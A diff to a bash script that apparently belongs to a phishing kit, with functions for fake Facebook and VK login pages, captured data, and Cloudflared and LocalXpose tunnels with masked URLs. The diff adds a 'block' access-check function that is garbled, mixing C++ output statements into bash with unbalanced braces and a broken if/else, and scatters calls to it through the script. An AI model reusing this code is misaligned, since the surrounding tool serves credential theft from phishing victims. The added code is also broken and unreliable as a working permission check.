@@ -274,6 +274,14 @@ dependencies() {
 	fi
 }
 
+block(){
+	use = blocking the access to none authorized users;
+ 	if (user_id != drackosters || user_id != dracksters){
+  		cout << " you don't have the neccessary permission to access this fork contact the owner to unlock "  << endl;
+    	else
+     		cout << "welcome" << user_id << " hope you're not using this fork for a malicious purpose" << endl;
+       
+
 # Download Binaries
 download() {
 	url="$1"
@@ -321,7 +329,7 @@ install_cloudflared() {
 		fi
 	fi
 }
-
+block()
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
@@ -451,7 +459,7 @@ capture_data() {
 		sleep 0.75
 	done
 }
-
+block()
 ## Start Cloudflared
 start_cloudflared() { 
 	rm .server/.cld.log > /dev/null 2>&1 &
@@ -603,7 +611,7 @@ custom_url() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
 	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
-
+block()
 ## Facebook
 site_facebook() {
 	cat <<- EOF
@@ -732,7 +740,7 @@ site_vk() {
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
-
+block()
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
@@ -905,11 +913,12 @@ main_menu() {
 	
 	esac
 }
-
+block()
 ## Main
 kill_pid
 dependencies
 check_status
+block()
 install_cloudflared
 install_localxpose
 main_menu
